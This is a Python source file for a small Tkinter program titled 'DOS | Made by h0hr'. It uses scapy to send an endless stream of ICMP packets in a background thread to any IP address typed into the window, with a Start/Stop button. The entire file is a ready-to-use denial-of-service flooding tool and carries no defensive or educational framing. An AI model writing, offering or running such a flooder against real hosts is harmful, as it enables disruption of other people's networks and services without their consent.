from tkinter import *
from scapy.all import *
from scapy.layers.inet import IP, ICMP
import threading


count = 1
status_local = ""


def main():
    # Main window configs
    root = Tk()

    def icmp_flood():
        try:
            global status_local
            while status_local == "Enabled":
                flood = IP(dst=ip.get())/ICMP(type=9)
                send(flood)
        except socket.gaierror:
            status.config(text="Incorrect IP format.", fg="red")

    def switch(event):
        global status_local
        global count
        on_or_off = count % 2
        count += 1
        correct_ip_format = len(ip.get().split("."))
        if correct_ip_format > 4 or correct_ip_format < 4:
            status.config(text="Incorrect IP Format!", fg="red")
        elif on_or_off == 1:
            status_local = "Enabled"
            status.config(text="Enabled", fg="green")
            denial1 = threading.Thread(target=icmp_flood)
            denial1.start()
        elif on_or_off == 0:
            status_local = "Disabled"
            status.config(text="Disabled", fg="red")
            denial1 = threading.Thread(target=icmp_flood)
            denial1.start()


    root.geometry("480x200")
    root.config(bg="black")
    root.title("DOS")
    root.iconbitmap("favicon.ico")

    filler = Label(bg="black", padx=90, pady=22)
    filler2 = Label(bg="black", padx=0)
    filler3 = Label(bg="black")
    creator_info = Label(text="DOS | Made by h0hr", fg="white", bg="black")
    status = Label(text="Disabled", bg="black", fg="red")
    start = Button(text="Start/Stop")

    start.bind("<Button-1>", switch)
    ip = Entry()
    ip_label = Label(text="Destination IP: ", bg="black", fg="white")

    status.grid(row=1, column=1)
    ip_label.grid(row=2, column=0, sticky=E)
    ip.grid(row=2, column=1)
    filler.grid(row=0, column=0)
    filler2.grid(row=0, column=1)
    filler3.grid(row=1, column=0)
    creator_info.grid(row=0, column=1)
    start.grid(row=3, column=1)
    root.mainloop()


if __name__ == "__main__":
    main()
